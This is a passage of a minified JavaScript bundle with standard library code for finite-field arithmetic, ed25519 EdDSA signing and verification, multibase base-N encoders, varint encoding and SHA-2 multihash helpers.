function");const c=t[i];if(!(o&&c===void 0)&&!a(c,t))throw new Error("param "+String(i)+" is invalid. Expected "+s+", got "+c)};for(const[i,s]of Object.entries(e))n(i,s,!1);for(const[i,s]of Object.entries(r))n(i,s,!0);return t}function $v(t){const e=new WeakMap;return(r,...n)=>{const i=e.get(r);if(i!==void 0)return i;const s=t(r,...n);return e.set(r,s),s}}const Zt=BigInt(0),xt=BigInt(1),Ca=BigInt(2),AN=BigInt(3),Vm=BigInt(4),Rv=BigInt(5),Dv=BigInt(8);function Lt(t,e){const r=t%e;return r>=Zt?r:e+r}function xN(t,e,r){if(e<Zt)throw new Error("invalid exponent, negatives unsupported");if(r<=Zt)throw new Error("invalid modulus");if(r===xt)return Zt;let n=xt;for(;e>Zt;)e&xt&&(n=n*t%r),t=t*t%r,e>>=xt;return n}function mi(t,e,r){let n=t;for(;e-- >Zt;)n*=n,n%=r;return n}function Bv(t,e){if(t===Zt)throw new Error("invert: expected non-zero number");if(e<=Zt)throw new Error("invert: expected positive modulus, got "+e);let r=Lt(t,e),n=e,i=Zt,s=xt;for(;r!==Zt;){const o=n/r,a=n%r,c=i-s*o;n=r,r=a,i=s,s=c}if(n!==xt)throw new Error("invert: does not exist");return Lt(i,e)}function IN(t){const e=(t-xt)/Ca;let r,n,i;for(r=t-xt,n=0;r%Ca===Zt;r/=Ca,n++);for(i=Ca;i<t&&xN(i,e,t)!==t-xt;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(n===1){const o=(t+xt)/Vm;return function(a,c){const l=a.pow(c,o);if(!a.eql(a.sqr(l),c))throw new Error("Cannot find square root");return l}}const s=(r+xt)/Ca;return function(o,a){if(o.pow(a,e)===o.neg(o.ONE))throw new Error("Cannot find square root");let c=n,l=o.pow(o.mul(o.ONE,i),r),u=o.pow(a,s),h=o.pow(a,r);for(;!o.eql(h,o.ONE);){if(o.eql(h,o.ZERO))return o.ZERO;let d=1;for(let g=o.sqr(h);d<c&&!o.eql(g,o.ONE);d++)g=o.sqr(g);const f=o.pow(l,xt<<BigInt(c-d-1));l=o.sqr(f),u=o.mul(u,f),h=o.mul(h,l),c=d}return u}}function SN(t){if(t%Vm===AN){const e=(t+xt)/Vm;return function(r,n){const i=r.pow(n,e);if(!r.eql(r.sqr(i),n))throw new Error("Cannot find square root");return i}}if(t%Dv===Rv){const e=(t-Rv)/Dv;return function(r,n){const i=r.mul(n,Ca),s=r.pow(i,e),o=r.mul(n,s),a=r.mul(r.mul(o,Ca),s),c=r.mul(o,r.sub(a,r.ONE));if(!r.eql(r.sqr(c),n))throw new Error("Cannot find square root");return c}}return IN(t)}const NN=(t,e)=>(Lt(t,e)&xt)===xt,PN=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function kN(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},r=PN.reduce((n,i)=>(n[i]="function",n),e);return Lb(t,r)}function ON(t,e,r){if(r<Zt)throw new Error("invalid exponent, negatives unsupported");if(r===Zt)return t.ONE;if(r===xt)return e;let n=t.ONE,i=e;for(;r>Zt;)r&xt&&(n=t.mul(n,i)),i=t.sqr(i),r>>=xt;return n}function _N(t,e){const r=new Array(e.length),n=e.reduce((s,o,a)=>t.is0(o)?s:(r[a]=s,t.mul(s,o)),t.ONE),i=t.inv(n);return e.reduceRight((s,o,a)=>t.is0(o)?s:(r[a]=t.mul(s,r[a]),t.mul(s,o)),i),r}function bE(t,e){const r=e!==void 0?e:t.toString(2).length,n=Math.ceil(r/8);return{nBitLength:r,nByteLength:n}}function vE(t,e,r=!1,n={}){if(t<=Zt)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:s}=bE(t,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:t,isLE:r,BITS:i,BYTES:s,MASK:EN(i),ZERO:Zt,ONE:xt,create:c=>Lt(c,t),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return Zt<=c&&c<t},is0:c=>c===Zt,isOdd:c=>(c&xt)===xt,neg:c=>Lt(-c,t),eql:(c,l)=>c===l,sqr:c=>Lt(c*c,t),add:(c,l)=>Lt(c+l,t),sub:(c,l)=>Lt(c-l,t),mul:(c,l)=>Lt(c*l,t),pow:(c,l)=>ON(a,c,l),div:(c,l)=>Lt(c*Bv(l,t),t),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>Bv(c,t),sqrt:n.sqrt||(c=>(o||(o=SN(t)),o(a,c))),invertBatch:c=>_N(a,c),cmov:(c,l,u)=>u?l:c,toBytes:c=>r?qm(c,s):yE(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return r?P0(c):yN(c)}});return Object.freeze(a)}const Lv=BigInt(0),gp=BigInt(1);function j1(t,e){const r=e.negate();return t?r:e}function EE(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function H1(t,e){EE(t,e);const r=Math.ceil(e/t)+1,n=2**(t-1);return{windows:r,windowSize:n}}function TN(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((r,n)=>{if(!(r instanceof e))throw new Error("invalid point at index "+n)})}function $N(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((r,n)=>{if(!e.isValid(r))throw new Error("invalid scalar at index "+n)})}const q1=new WeakMap,CE=new WeakMap;function V1(t){return CE.get(t)||1}function RN(t,e){return{constTimeNegate:j1,hasPrecomputes(r){return V1(r)!==1},unsafeLadder(r,n,i=t.ZERO){let s=r;for(;n>Lv;)n&gp&&(i=i.add(s)),s=s.double(),n>>=gp;return i},precomputeWindow(r,n){const{windows:i,windowSize:s}=H1(n,e),o=[];let a=r,c=a;for(let l=0;l<i;l++){c=a,o.push(c);for(let u=1;u<s;u++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(r,n,i){const{windows:s,windowSize:o}=H1(r,e);let a=t.ZERO,c=t.BASE;const l=BigInt(2**r-1),u=2**r,h=BigInt(r);for(let d=0;d<s;d++){const f=d*o;let g=Number(i&l);i>>=h,g>o&&(g-=u,i+=gp);const p=f,w=f+Math.abs(g)-1,m=d%2!==0,b=g<0;g===0?c=c.add(j1(m,n[p])):a=a.add(j1(b,n[w]))}return{p:a,f:c}},wNAFUnsafe(r,n,i,s=t.ZERO){const{windows:o,windowSize:a}=H1(r,e),c=BigInt(2**r-1),l=2**r,u=BigInt(r);for(let h=0;h<o;h++){const d=h*a;if(i===Lv)break;let f=Number(i&c);if(i>>=u,f>a&&(f-=l,i+=gp),f===0)continue;let g=n[d+Math.abs(f)-1];f<0&&(g=g.negate()),s=s.add(g)}return s},getPrecomputes(r,n,i){let s=q1.get(n);return s||(s=this.precomputeWindow(n,r),r!==1&&q1.set(n,i(s))),s},wNAFCached(r,n,i){const s=V1(r);return this.wNAF(s,this.getPrecomputes(s,r,i),n)},wNAFCachedUnsafe(r,n,i,s){const o=V1(r);return o===1?this.unsafeLadder(r,n,s):this.wNAFUnsafe(o,this.getPrecomputes(o,r,i),n,s)},setWindowSize(r,n){EE(n,e),CE.set(r,n),q1.delete(r)}}}function DN(t,e,r,n){if(TN(r,t),$N(n,e),r.length!==n.length)throw new Error("arrays of points and scalars must have equal length");const i=t.ZERO,s=vN(BigInt(r.length)),o=s>12?s-3:s>4?s-2:s?2:1,a=(1<<o)-1,c=new Array(a+1).fill(i),l=Math.floor((e.BITS-1)/o)*o;let u=i;for(let h=l;h>=0;h-=o){c.fill(i);for(let f=0;f<n.length;f++){const g=n[f],p=Number(g>>BigInt(h)&BigInt(a));c[p]=c[p].add(r[f])}let d=i;for(let f=c.length-1,g=i;f>0;f--)g=g.add(c[f]),d=d.add(g);if(u=u.add(d),h!==0)for(let f=0;f<o;f++)u=u.double()}return u}function BN(t){return kN(t.Fp),Lb(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...bE(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}const qn=BigInt(0),$r=BigInt(1),wp=BigInt(2),LN=BigInt(8),UN={zip215:!0};function MN(t){const e=BN(t);return Lb(t,{hash:"function",a:"bigint",d:"bigint",randomBytes:"function"},{adjustScalarBytes:"function",domain:"function",uvRatio:"function",mapToCurve:"function"}),Object.freeze({...e})}function FN(t){const e=MN(t),{Fp:r,n,prehash:i,hash:s,randomBytes:o,nByteLength:a,h:c}=e,l=wp<<BigInt(a*8)-$r,u=r.create,h=vE(e.n,e.nBitLength),d=e.uvRatio||((y,E)=>{try{return{isValid:!0,value:r.sqrt(y*r.inv(E))}}catch{return{isValid:!1,value:qn}}}),f=e.adjustScalarBytes||(y=>y),g=e.domain||((y,E,k)=>{if(F1("phflag",k),E.length||k)throw new Error("Contexts/pre-hash are not supported");return y});function p(y,E){Ah("coordinate "+y,E,qn,l)}function w(y){if(!(y instanceof v))throw new Error("ExtendedPoint expected")}const m=$v((y,E)=>{const{ex:k,ey:_,ez:R}=y,L=y.is0();E==null&&(E=L?LN:r.inv(R));const q=u(k*E),W=u(_*E),Z=u(R*E);if(L)return{x:qn,y:$r};if(Z!==$r)throw new Error("invZ was invalid");return{x:q,y:W}}),b=$v(y=>{const{a:E,d:k}=e;if(y.is0())throw new Error("bad point: ZERO");const{ex:_,ey:R,ez:L,et:q}=y,W=u(_*_),Z=u(R*R),G=u(L*L),ne=u(G*G),de=u(W*E),Se=u(G*u(de+Z)),Ne=u(ne+u(k*u(W*Z)));if(Se!==Ne)throw new Error("bad point: equation left != right (1)");const be=u(_*R),ke=u(L*q);if(be!==ke)throw new Error("bad point: equation left != right (2)");return!0});class v{constructor(E,k,_,R){this.ex=E,this.ey=k,this.ez=_,this.et=R,p("x",E),p("y",k),p("z",_),p("t",R),Object.freeze(this)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static fromAffine(E){if(E instanceof v)throw new Error("extended point not allowed");const{x:k,y:_}=E||{};return p("x",k),p("y",_),new v(k,_,$r,u(k*_))}static normalizeZ(E){const k=r.invertBatch(E.map(_=>_.ez));return E.map((_,R)=>_.toAffine(k[R])).map(v.fromAffine)}static msm(E,k){return DN(v,h,E,k)}_setWindowSize(E){C.setWindowSize(this,E)}assertValidity(){b(this)}equals(E){w(E);const{ex:k,ey:_,ez:R}=this,{ex:L,ey:q,ez:W}=E,Z=u(k*W),G=u(L*R),ne=u(_*W),de=u(q*R);return Z===G&&ne===de}is0(){return this.equals(v.ZERO)}negate(){return new v(u(-this.ex),this.ey,this.ez,u(-this.et))}double(){const{a:E}=e,{ex:k,ey:_,ez:R}=this,L=u(k*k),q=u(_*_),W=u(wp*u(R*R)),Z=u(E*L),G=k+_,ne=u(u(G*G)-L-q),de=Z+q,Se=de-W,Ne=Z-q,be=u(ne*Se),ke=u(de*Ne),Me=u(ne*Ne),Ue=u(Se*de);return new v(be,ke,Ue,Me)}add(E){w(E);const{a:k,d:_}=e,{ex:R,ey:L,ez:q,et:W}=this,{ex:Z,ey:G,ez:ne,et:de}=E;if(k===BigInt(-1)){const J2=u((L-R)*(G+Z)),Q2=u((L+R)*(G-Z)),_1=u(Q2-J2);if(_1===qn)return this.double();const Y2=u(q*wp*de),X2=u(W*wp*ne),ev=X2+Y2,tv=Q2+J2,rv=X2-Y2,H7=u(ev*_1),q7=u(tv*rv),V7=u(ev*rv),W7=u(_1*tv);return new v(H7,q7,W7,V7)}const Se=u(R*Z),Ne=u(L*G),be=u(W*_*de),ke=u(q*ne),Me=u((R+L)*(Z+G)-Se-Ne),Ue=ke-be,Le=ke+be,wt=u(Ne-k*Se),bn=u(Me*Ue),hp=u(Le*wt),z7=u(Me*wt),j7=u(Ue*Le);return new v(bn,hp,j7,z7)}subtract(E){return this.add(E.negate())}wNAF(E){return C.wNAFCached(this,E,v.normalizeZ)}multiply(E){const k=E;Ah("scalar",k,$r,n);const{p:_,f:R}=this.wNAF(k);return v.normalizeZ([_,R])[0]}multiplyUnsafe(E,k=v.ZERO){const _=E;return Ah("scalar",_,qn,n),_===qn?I:this.is0()||_===$r?this:C.wNAFCachedUnsafe(this,_,v.normalizeZ,k)}isSmallOrder(){return this.multiplyUnsafe(c).is0()}isTorsionFree(){return C.unsafeLadder(this,n).is0()}toAffine(E){return m(this,E)}clearCofactor(){const{h:E}=e;return E===$r?this:this.multiplyUnsafe(E)}static fromHex(E,k=!1){const{d:_,a:R}=e,L=r.BYTES;E=Qi("pointHex",E,L),F1("zip215",k);const q=E.slice(),W=E[L-1];q[L-1]=W&-129;const Z=P0(q),G=k?l:r.ORDER;Ah("pointHex.y",Z,qn,G);const ne=u(Z*Z),de=u(ne-$r),Se=u(_*ne-R);let{isValid:Ne,value:be}=d(de,Se);if(!Ne)throw new Error("Point.fromHex: invalid y coordinate");const ke=(be&$r)===$r,Me=(W&128)!==0;if(!k&&be===qn&&Me)throw new Error("Point.fromHex: x=0 and x_0=1");return Me!==ke&&(be=u(-be)),v.fromAffine({x:be,y:Z})}static fromPrivateKey(E){return P(E).point}toRawBytes(){const{x:E,y:k}=this.toAffine(),_=qm(k,r.BYTES);return _[_.length-1]|=E&$r?128:0,_}toHex(){return Bb(this.toRawBytes())}}v.BASE=new v(e.Gx,e.Gy,$r,u(e.Gx*e.Gy)),v.ZERO=new v(qn,$r,$r,qn);const{BASE:x,ZERO:I}=v,C=RN(v,a*8);function N(y){return Lt(y,n)}function S(y){return N(P0(y))}function P(y){const E=r.BYTES;y=Qi("private key",y,E);const k=Qi("hashed private key",s(y),2*E),_=f(k.slice(0,E)),R=k.slice(E,2*E),L=S(_),q=x.multiply(L),W=q.toRawBytes();return{head:_,prefix:R,scalar:L,point:q,pointBytes:W}}function T(y){return P(y).pointBytes}function D(y=new Uint8Array,...E){const k=Tv(...E);return S(s(g(k,Qi("context",y),!!i)))}function z(y,E,k={}){y=Qi("message",y),i&&(y=i(y));const{prefix:_,scalar:R,pointBytes:L}=P(E),q=D(k.context,_,y),W=x.multiply(q).toRawBytes(),Z=D(k.context,W,L,y),G=N(q+Z*R);Ah("signature.s",G,qn,n);const ne=Tv(W,qm(G,r.BYTES));return Qi("result",ne,r.BYTES*2)}const V=UN;function O(y,E,k,_=V){const{context:R,zip215:L}=_,q=r.BYTES;y=Qi("signature",y,2*q),E=Qi("message",E),k=Qi("publicKey",k,q),L!==void 0&&F1("zip215",L),i&&(E=i(E));const W=P0(y.slice(q,2*q));let Z,G,ne;try{Z=v.fromHex(k,L),G=v.fromHex(y.slice(0,q),L),ne=x.multiplyUnsafe(W)}catch{return!1}if(!L&&Z.isSmallOrder())return!1;const de=D(R,G.toRawBytes(),Z.toRawBytes(),E);return G.add(Z.multiplyUnsafe(de)).subtract(ne).clearCofactor().equals(v.ZERO)}return x._setWindowSize(8),{CURVE:e,getPublicKey:T,sign:z,verify:O,ExtendedPoint:v,utils:{getExtendedPublicKey:P,randomPrivateKey:()=>o(r.BYTES),precompute(y=8,E=v.BASE){return E._setWindowSize(y),E.multiply(BigInt(3)),E}}}}BigInt(0),BigInt(1);const Ub=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949"),Uv=BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752");BigInt(0);const zN=BigInt(1),Mv=BigInt(2);BigInt(3);const jN=BigInt(5),HN=BigInt(8);function qN(t){const e=BigInt(10),r=BigInt(20),n=BigInt(40),i=BigInt(80),s=Ub,o=t*t%s*t%s,a=mi(o,Mv,s)*o%s,c=mi(a,zN,s)*t%s,l=mi(c,jN,s)*c%s,u=mi(l,e,s)*l%s,h=mi(u,r,s)*u%s,d=mi(h,n,s)*h%s,f=mi(d,i,s)*d%s,g=mi(f,i,s)*d%s,p=mi(g,e,s)*l%s;return{pow_p_5_8:mi(p,Mv,s)*t%s,b2:o}}function VN(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}function WN(t,e){const r=Ub,n=Lt(e*e*e,r),i=Lt(n*n*e,r),s=qN(t*i).pow_p_5_8;let o=Lt(t*n*s,r);const a=Lt(e*o*o,r),c=o,l=Lt(o*Uv,r),u=a===t,h=a===Lt(-t,r),d=a===Lt(-t*Uv,r);return u&&(o=c),(h||d)&&(o=l),NN(o,r)&&(o=Lt(-o,r)),{isValid:u||h,value:o}}const GN=vE(Ub,void 0,!0),KN={a:BigInt(-1),d:BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),Fp:GN,n:BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),h:HN,Gx:BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),Gy:BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),hash:gN,randomBytes:fE,adjustScalarBytes:VN,uvRatio:WN},AE=FN(KN),ZN="EdDSA",JN="JWT",Z0=".",Fg="base64url",xE="utf8",IE="utf8",QN=":",YN="did",XN="key",Fv="base58btc",eP="z",tP="K36",rP=32;function Mb(t){return globalThis.Buffer!=null?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):t}function SE(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?Mb(globalThis.Buffer.allocUnsafe(t)):new Uint8Array(t)}function NE(t,e){e||(e=t.reduce((i,s)=>i+s.length,0));const r=SE(e);let n=0;for(const i of t)r.set(i,n),n+=i.length;return Mb(r)}function nP(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var r=new Uint8Array(256),n=0;n<r.length;n++)r[n]=255;for(var i=0;i<t.length;i++){var s=t.charAt(i),o=s.charCodeAt(0);if(r[o]!==255)throw new TypeError(s+" is ambiguous");r[o]=i}var a=t.length,c=t.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function h(g){if(g instanceof Uint8Array||(ArrayBuffer.isView(g)?g=new Uint8Array(g.buffer,g.byteOffset,g.byteLength):Array.isArray(g)&&(g=Uint8Array.from(g))),!(g instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(g.length===0)return"";for(var p=0,w=0,m=0,b=g.length;m!==b&&g[m]===0;)m++,p++;for(var v=(b-m)*u+1>>>0,x=new Uint8Array(v);m!==b;){for(var I=g[m],C=0,N=v-1;(I!==0||C<w)&&N!==-1;N--,C++)I+=256*x[N]>>>0,x[N]=I%a>>>0,I=I/a>>>0;if(I!==0)throw new Error("Non-zero carry");w=C,m++}for(var S=v-w;S!==v&&x[S]===0;)S++;for(var P=c.repeat(p);S<v;++S)P+=t.charAt(x[S]);return P}function d(g){if(typeof g!="string")throw new TypeError("Expected String");if(g.length===0)return new Uint8Array;var p=0;if(g[p]!==" "){for(var w=0,m=0;g[p]===c;)w++,p++;for(var b=(g.length-p)*l+1>>>0,v=new Uint8Array(b);g[p];){var x=r[g.charCodeAt(p)];if(x===255)return;for(var I=0,C=b-1;(x!==0||I<m)&&C!==-1;C--,I++)x+=a*v[C]>>>0,v[C]=x%256>>>0,x=x/256>>>0;if(x!==0)throw new Error("Non-zero carry");m=I,p++}if(g[p]!==" "){for(var N=b-m;N!==b&&v[N]===0;)N++;for(var S=new Uint8Array(w+(b-N)),P=w;N!==b;)S[P++]=v[N++];return S}}}function f(g){var p=d(g);if(p)return p;throw new Error(`Non-${e} character`)}return{encode:h,decodeUnsafe:d,decode:f}}var iP=nP,sP=iP;const PE=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},oP=t=>new TextEncoder().encode(t),aP=t=>new TextDecoder().decode(t);let cP=class{constructor(e,r,n){this.name=e,this.prefix=r,this.baseEncode=n}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}},lP=class{constructor(e,r,n){if(this.name=e,this.prefix=r,r.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=r.codePointAt(0),this.baseDecode=n}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return kE(this,e)}},uP=class{constructor(e){this.decoders=e}or(e){return kE(this,e)}decode(e){const r=e[0],n=this.decoders[r];if(n)return n.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}};const kE=(t,e)=>new uP({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});let hP=class{constructor(e,r,n,i){this.name=e,this.prefix=r,this.baseEncode=n,this.baseDecode=i,this.encoder=new cP(e,r,n),this.decoder=new lP(e,r,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}};const zg=({name:t,prefix:e,encode:r,decode:n})=>new hP(t,e,r,n),Uf=({prefix:t,name:e,alphabet:r})=>{const{encode:n,decode:i}=sP(r,e);return zg({prefix:t,name:e,encode:n,decode:s=>PE(i(s))})},dP=(t,e,r,n)=>{const i={};for(let u=0;u<e.length;++u)i[e[u]]=u;let s=t.length;for(;t[s-1]==="=";)--s;const o=new Uint8Array(s*r/8|0);let a=0,c=0,l=0;for(let u=0;u<s;++u){const h=i[t[u]];if(h===void 0)throw new SyntaxError(`Non-${n} character`);c=c<<r|h,a+=r,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=r||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},fP=(t,e,r)=>{const n=e[e.length-1]==="=",i=(1<<r)-1;let s="",o=0,a=0;for(let c=0;c<t.length;++c)for(a=a<<8|t[c],o+=8;o>r;)o-=r,s+=e[i&a>>o];if(o&&(s+=e[i&a<<r-o]),n)for(;s.length*r&7;)s+="=";return s},cr=({name:t,prefix:e,bitsPerChar:r,alphabet:n})=>zg({prefix:e,name:t,encode(i){return fP(i,n,r)},decode(i){return dP(i,n,r,t)}}),pP=zg({prefix:"\0",name:"identity",encode:t=>aP(t),decode:t=>oP(t)});var gP=Object.freeze({__proto__:null,identity:pP});const wP=cr({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var mP=Object.freeze({__proto__:null,base2:wP});const yP=cr({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var bP=Object.freeze({__proto__:null,base8:yP});const vP=Uf({prefix:"9",name:"base10",alphabet:"0123456789"});var EP=Object.freeze({__proto__:null,base10:vP});const CP=cr({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),AP=cr({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var xP=Object.freeze({__proto__:null,base16:CP,base16upper:AP});const IP=cr({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),SP=cr({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),NP=cr({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),PP=cr({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),kP=cr({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),OP=cr({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),_P=cr({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),TP=cr({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),$P=cr({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var RP=Object.freeze({__proto__:null,base32:IP,base32upper:SP,base32pad:NP,base32padupper:PP,base32hex:kP,base32hexupper:OP,base32hexpad:_P,base32hexpadupper:TP,base32z:$P});const DP=Uf({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),BP=Uf({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var LP=Object.freeze({__proto__:null,base36:DP,base36upper:BP});const UP=Uf({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),MP=Uf({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var FP=Object.freeze({__proto__:null,base58btc:UP,base58flickr:MP});const zP=cr({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),jP=cr({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),HP=cr({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),qP=cr({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var VP=Object.freeze({__proto__:null,base64:zP,base64pad:jP,base64url:HP,base64urlpad:qP});const OE=Array.from(""),WP=OE.reduce((t,e,r)=>(t[r]=e,t),[]),GP=OE.reduce((t,e,r)=>(t[e.codePointAt(0)]=r,t),[]);function KP(t){return t.reduce((e,r)=>(e+=WP[r],e),"")}function ZP(t){const e=[];for(const r of t){const n=GP[r.codePointAt(0)];if(n===void 0)throw new Error(`Non-base256emoji character: ${r}`);e.push(n)}return new Uint8Array(e)}const JP=zg({prefix:"",name:"base256emoji",encode:KP,decode:ZP});var QP=Object.freeze({__proto__:null,base256emoji:JP}),YP=_E,zv=128,XP=-128,ek=Math.pow(2,31);function _E(t,e,r){e=e||[],r=r||0;for(var n=r;t>=ek;)e[r++]=t&255|zv,t/=128;for(;t&XP;)e[r++]=t&255|zv,t>>>=7;return e[r]=t|0,_E.bytes=r-n+1,e}var tk=Wm,rk=128,jv=127;function Wm(t,n){var r=0,n=n||0,i=0,s=n,o,a=t.length;do{if(s>=a)throw Wm.bytes=0,new RangeError("Could not decode varint");o=t[s++],r+=i<28?(o&jv)<<i:(o&jv)*Math.pow(2,i),i+=7}while(o>=rk);return Wm.bytes=s-n,r}var nk=Math.pow(2,7),ik=Math.pow(2,14),sk=Math.pow(2,21),ok=Math.pow(2,28),ak=Math.pow(2,35),ck=Math.pow(2,42),lk=Math.pow(2,49),uk=Math.pow(2,56),hk=Math.pow(2,63),dk=function(t){return t<nk?1:t<ik?2:t<sk?3:t<ok?4:t<ak?5:t<ck?6:t<lk?7:t<uk?8:t<hk?9:10},fk={encode:YP,decode:tk,encodingLength:dk},TE=fk;const Hv=(t,e,r=0)=>(TE.encode(t,e,r),e),qv=t=>TE.encodingLength(t),Gm=(t,e)=>{const r=e.byteLength,n=qv(t),i=n+qv(r),s=new Uint8Array(i+r);return Hv(t,s,0),Hv(r,s,n),s.set(e,i),new pk(t,r,e,s)};let pk=class{constructor(e,r,n,i){this.code=e,this.size=r,this.digest=n,this.bytes=i}};const $E=({name:t,code:e,encode:r})=>new gk(t,e,r);let gk=class{constructor(e,r,n){this.name=e,this.code=r,this.encode=n}digest(e){if(e instanceof Uint8Array){const r=this.encode(e);return r instanceof Uint8Array?Gm(this.code,r):r.then(n=>Gm(this.code,n))}else throw Error("Unknown type, must be binary type")}};const RE=t=>async e=>new Uint8Array(await crypto.subtle.digest(t,e)),wk=$E({name:"sha2-256",code:18,encode:RE("SHA-256")}),mk=$E({name:"sha2-512",code:19,encode:RE("SHA-512")});var yk=Object.freeze({__proto__:null,sha256:wk,sha512:mk});const DE=0,bk="identity",BE=PE,vk=t=>Gm(DE,BE(t)),Ek={code:DE,name:bk,encode:BE,digest:vk};var Ck=Object.freeze({__proto__:null,identity:Ek});new TextEncoder,new TextDecoder;const Vv={...gP,...mP,...bP,...EP,...xP,...RP,...LP,...FP,...VP,...QP};({...yk,...Ck});function LE(t,e,r,n){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:r},decoder:{decode:n}}}const Wv=LE("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),W1=LE("ascii","a",t=>{let e="a";for(let r=0;r<t.length;r++)e+=String.fromCharCode(t[r]);return e},t=>{t=t.substring(1);const e=SE(t.length);for(let r=0;r<t.length;r++)e[r]=t.charCodeAt(r);return e}),UE={utf8:Wv,"utf-8":Wv,hex:Vv.base16,latin1:W1,ascii:W1,binary:W1,...Vv};function jg(t,e="utf8"){const r=UE[e];if(!r)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t.buffer,t.byteOffset,t.byteLength).toString("utf8"):r.encoder.encode(t).substring(1)}function ch(t,e="utf8"){const r=UE[e];if(!r)throw new Error(`Unsupported encoding 